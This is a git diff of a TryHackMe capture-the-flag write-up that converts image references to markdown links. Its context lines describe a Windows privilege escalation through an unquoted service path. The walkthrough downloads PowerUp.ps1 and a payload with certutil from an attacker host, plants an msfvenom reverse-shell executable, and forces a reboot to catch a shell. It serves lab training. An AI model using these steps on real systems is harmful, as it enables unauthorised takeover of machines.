@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-quotient.png
+![quotient.png](../assets/quotient_assets/quotient.png)
 
 This box begins a bit different than most THM machines. Here it appears we already have low-privileged access to the machine and can access it via RDP. It appears our task is to escalate privileges and grab a flag from the administrator's Desktop. 
 
@@ -31,7 +31,7 @@ I'll RDP to the target using xfreerdp with the credentials provided:
 
 Once logged in we can check out what kind of privileges we have on the target by running `whoami /all`
 
-whoami.png
+![whoami.png](../assets/quotient_assets/whoami.png)
 
 Let's go ahead and transfer over PowerUp.ps1 to help identify a privilege escalation path.
 
@@ -41,11 +41,11 @@ certutil -urlcache -split -f "http://10.6.61.45/PowerUp.ps1"
 
 I'll set up a Python http server on my machine and transfer the file over:
 
-transfer.png
+![transfer.png](../assets/quotient_assets/transfer.png)
 
 I can then run the script by importing the module and issuing the command `Invoke-AllChecks`
 
-all_checks.png
+![all_checks.png](../assets/quotient_assets/all_checks.png)
 
 Nice! PowerUp has identified an unquoted service path we can likely exploit. Because there is a space in between Devservice Files, and it is not wrapped in parenthesis, we should be able to create a malicious file with a reverse shell back to our machine. If we call the file Devservice.exe, it will be executed when we turn on and off the machine or restart the service. 
 
@@ -55,7 +55,7 @@ Let's double check we have write access to the Folder though:
 icacls "C:\Program Files\Development Files\ "
 ```
 
-write_access.png
+![write_access.png](../assets/quotient_assets/write_access.png)
 
 Great, looks like we can write to the folder. Let's head back to our attacking machine and create a reverse shell using msfvenom:
 
@@ -79,7 +79,7 @@ certutil -urlcache -split -f "http://10.6.61.45/Devservice.exe"
 
 Once loaded we can confirm the file is where it needs to be:
 
-confirm.png
+![confirm.png](../assets/quotient_assets/confirm.png)
 
 We can now set up a Netcat listener on port 443 on our attacking machine and restart the target:
 
@@ -89,7 +89,7 @@ shutdown /r /t 0
 
 After just a minute or so we will catch a shell in our listener and grab the flag!
 
-flag.png
+![flag.png](../assets/quotient_assets/flag.png)
 
 Thanks for following along!
 
